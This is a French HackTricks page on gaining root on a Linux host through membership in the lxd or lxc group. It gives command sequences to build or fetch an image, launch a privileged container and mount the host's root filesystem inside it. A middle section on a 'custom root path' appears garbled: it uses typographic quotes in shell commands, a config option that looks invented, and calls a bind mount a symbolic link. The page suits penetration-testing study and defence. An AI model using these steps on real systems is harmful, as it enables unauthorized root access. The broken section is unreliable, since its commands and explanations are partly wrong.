<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Si vous appartenez au groupe _**lxd**_ **ou** _**lxc**_, vous pouvez devenir root

# Exploitation sans internet

Vous pouvez installer sur votre machine ce générateur de distribution : [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) \(suivez les instructions du github\):
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
Ensuite, téléchargez sur le serveur les fichiers **lxd.tar.xz** et **rootfs.squashfs**

Ajoutez l'image:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# Créer un conteneur et ajouter le chemin racine

Lorsque vous créez un conteneur LXD, vous pouvez spécifier un chemin racine personnalisé pour le conteneur. Si vous spécifiez un chemin racine qui est un répertoire sur le système hôte, vous pouvez accéder à ce répertoire depuis le conteneur en tant que superutilisateur.

Pour créer un conteneur avec un chemin racine personnalisé, utilisez la commande suivante :

```
$ lxc launch <image> <container> -c security.privileged=true -c security.privileged.default=“true” -c raw.lxc=“lxc.mount.entry=/root/rootfs /var/lib/lxc/<container>/rootfs none bind,create=dir 0 0”
```

Dans cette commande, remplacez `<image>` par le nom de l'image que vous souhaitez utiliser pour le conteneur, et `<container>` par le nom que vous souhaitez donner au conteneur.

La partie importante de cette commande est l'option `-c raw.lxc`. Cette option permet de spécifier des options LXC brutes pour le conteneur. Dans ce cas, nous utilisons l'option `lxc.mount.entry` pour monter le répertoire `/root/rootfs` du système hôte dans le répertoire `/var/lib/lxc/<container>/rootfs` du conteneur. L'option `none` spécifie que nous ne voulons pas monter le répertoire avec des options spécifiques, et `bind,create=dir` spécifie que nous voulons monter le répertoire en tant que lien symbolique et créer le répertoire s'il n'existe pas déjà.

Une fois que vous avez créé le conteneur, vous pouvez vous y connecter en tant que superutilisateur et accéder au répertoire `/root/rootfs` du système hôte :

```
$ lxc exec <container> -- /bin/bash
# cd /root/rootfs
# ls
```

Vous pouvez également accéder au répertoire depuis n'importe quel processus s'exécutant dans le conteneur, même s'il ne s'exécute pas en tant que superutilisateur.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Exécutez le conteneur :
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Avec internet

Vous pouvez suivre [ces instructions](https://reboare.github.io/lxd/lxd-escape.html).
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Autres références

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
